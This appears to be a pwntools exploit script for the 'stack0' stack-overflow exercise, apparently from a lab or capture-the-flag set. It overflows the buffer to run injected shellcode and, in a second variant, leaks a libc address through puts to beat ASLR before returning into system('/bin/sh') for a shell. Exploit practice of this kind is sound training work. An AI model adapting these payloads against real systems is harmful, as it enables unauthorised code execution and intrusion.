from pwn import *
r = process("stack0")
raw_input("?")

# shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
# shellcode = asm(shellcraft.sh())
# shell_addr = 0x8049000
# get_plt = 0x804830c
# payload = "a"*(0x60+8-0x1c)
# payload += "a"*4 #ebp
# payload += p32(get_plt)
# payload += p32(shell_addr)
# payload += p32(shell_addr)
# # payload += p32(shellcode)
# print payload
# #print (0x60+8-0x1c)
# r.sendline(payload)
# r.sendline(shellcode)
# r.interactive()

def check():
	payload = "a"*(0x5c-0x1c) 
	payload += "a" #check
	
	r.sendline(payload)
	
	r.interactive()


def shell():
	shellcode = asm(shellcraft.sh())
	gets_plt = 0x804830c
	shell_addr = 0x8049000
	
	payload = "a"*(0x60+8-0x1c) 
	payload += "a"*0x4 #ebp
	payload += p32(gets_plt) #ret add 1
	payload += p32(shell_addr) #ret add 2
	payload += p32(shell_addr) # arg
	
	r.sendline(payload)
	r.sendline(shellcode)
	
	r.interactive()


def shell_aslr():
	puts_plt = 0x804832c
	gets_got = 0x8049630
	payload = "a"*(0x60+8-0x1c)
	main = 0x080483F4

	offset_gets = 0x05f3e0
	offset_system = 0x03ada0
	offset_sh = 0x0000E5F2 + 5
	payload = "a"*(0x60+8-0x1c)
	payload += "a"*4 #ebp
	payload += p32(puts_plt) #ret add 1
	payload += p32(main) #ret add 2
	payload	+= p32(gets_got) #arg
	r.sendline(payload)

	r.recvuntil("you have changed the 'modified' variable\n")
	res = r.recv(4)
	gets = u32(res)
	print hex(gets)

	libc = gets - offset_gets
	system = libc + offset_system
	sh = libc + offset_sh

	log.info("gets: %#x" % gets)
	log.info("libc: %#x" % libc)
	log.info("system: %#x" % system)
	log.info("sh: %#x" % sh)

	payload = "a"*(0x60-0x1c)
	payload += "a"*4 #ebp
	payload += p32(system) #ret add 1
	payload += p32(main) #ret add 2
	payload	+= p32(sh) #arg
	r.sendline(payload)

	r.interactive()

# check()
# shell()
shell_aslr()